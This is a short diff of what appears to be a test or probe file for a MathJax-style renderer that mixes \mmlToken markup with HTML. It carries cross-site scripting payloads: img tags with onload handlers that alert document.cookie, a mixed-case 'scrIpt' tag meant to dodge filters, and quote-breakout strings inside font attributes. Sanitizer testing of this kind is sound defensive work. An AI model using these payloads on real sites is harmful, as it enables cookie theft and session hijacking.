@@ -8,8 +8,8 @@
 \mmlToken{ms}[fontfamily="thxpewpew;I'm in ur walls ;))"]{<YOOOO<></><img src='https://github.com/NotTrueFalse/NotTrueFalse/blob/main/Figaro-Temparia-1694x847.jpeg?raw=true' onload=alert(/1/)>}
 \mmlToken{
 <img src=x onload=alert(document.cookie) />
-        <script>
+        <scrIpt>
 <math>a <msup>x 2</msup> + b x + c</math>
-        </script>
-    }[fontfamily="imnothere;11111111111111111111111111111\"'><a></a>"]{demo}
+        </scrIpt>
+    }[fontfamily="imnothere;"]{demo}
 ```
